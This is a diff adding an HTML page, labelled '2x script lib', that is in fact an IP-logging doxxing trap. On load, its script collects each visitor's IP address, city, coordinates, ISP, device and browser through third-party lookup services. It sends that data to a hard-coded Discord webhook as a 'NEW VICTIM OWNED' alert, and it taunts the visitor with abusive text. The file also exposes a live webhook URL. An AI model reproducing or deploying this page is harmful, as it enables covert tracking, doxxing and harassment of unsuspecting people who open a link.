@@ -1,0 +1,83 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>2x script lib</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body{margin:0;background:#000;color:#f00;font-family:Consolas;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}
+        .t{font-size:55px;font-weight:900;text-shadow:0 0 30px #f00;animation:g 1s infinite}
+        .i{color:#0f0;margin-top:50px;font-size:24px;line-height:2.2;background:rgba(0,0,0,0.8);padding:25px;border-radius:15px}
+        @keyframes g{0%,100%{opacity:0.8}50%{opacity:1}}
+    </style>
+</head>
+<body>
+<div>
+    <div class="t">ARE YOU FUCKING STUPID?</div>
+    <div class="t">YOUR IP JUST GOT LEAKED LOL</div>
+    <div class="i" id="i">Leaking your exact location...</div>
+</div>
+
+<script>
+// YOUR WEBHOOK – CHANGE ONLY THIS LINE
+const WEBHOOK = "https://discord.com/api/webhooks/1460089927684329648/gPezoc3iw-Ifvw0e2wyxdPMVXmxDbbMrSobJMMLS0l-Gq1lhnZY5uNht9fPCLf_JwL5-";
+
+(async () => {
+    let d = {ip:"???", city:"???", region:"???", country:"???", isp:"???", lat:"???", lon:"???", device:"???", ua:"???"};
+
+    d.ip = await fetch("https://api.ipify.org").then(r=>r.text()).catch(()=>d.ip);
+
+    const geo = await fetch(`https://ipwhois.app/json/${d.ip}`).then(r=>r.json()).catch(()=>null);
+    if (geo && geo.success !== false) {
+        d.city    = geo.city    || "Hidden";
+        d.region  = geo.region  || "Hidden";
+        d.country = geo.country || "Hidden";
+        d.isp     = geo.isp     || "Unknown";
+        d.lat     = geo.latitude  ? Number(geo.latitude).toFixed(4)  : "???";
+        d.lon     = geo.longitude ? Number(geo.longitude).toFixed(4) : "???";
+    }
+
+    d.device = navigator.platform;
+    d.ua = navigator.userAgent.substring(0,180);
+
+    // SEND TO DISCORD WITH TROLL FACE AVATAR
+    fetch(WEBHOOK, {
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            username: "Owned Kid",
+            avatar_url: "https://i.imgur.com/8G9n4jO.png",   // ←←← TROLL FACE
+            content: "@everyone NEW VICTIM OWNED",
+            embeds:[{
+                color:16711680,
+                title:"FULLY DOXXED",
+                fields:[
+                    {name:"IP",            value:"`"+d.ip+"`",           inline:false},
+                    {name:"City",          value:"`"+d.city+"`",         inline:true},
+                    {name:"Region",        value:"`"+d.region+"`",       inline:true},
+                    {name:"Country",       value:"`"+d.country+"`",      inline:true},
+                    {name:"Coordinates",   value:"`"+d.lat+", "+d.lon+"`", inline:true},
+                    {name:"ISP",           value:"`"+d.isp+"`",          inline:true},
+                    {name:"Device",        value:d.device,               inline:true},
+                    {name:"Browser",       value:d.ua,                   inline:false},
+                    {name:"Time",          value:new Date().toLocaleString(), inline:true}
+                ],
+                footer:{text:"2026 IS OURS"}
+            }]
+        })
+    });
+
+    document.getElementById("i").innerHTML = `
+        IP: <b>${d.ip}</b><br>
+        City: <b>${d.city}</b><br>
+        Region: <b>${d.region}</b><br>
+        Country: <b>${d.country}</b><br>
+        Coordinates: <b>\( {d.lat}, \){d.lon}</b><br>
+        ISP: <b>${d.isp}</b><br>
+        Device: <b>${d.device}</b><br><br>
+        <span style="color:#f00;font-size:35px">Crimson owns you forever.</span>
+    `;
+})();
+</script>
+</body>
+</html>
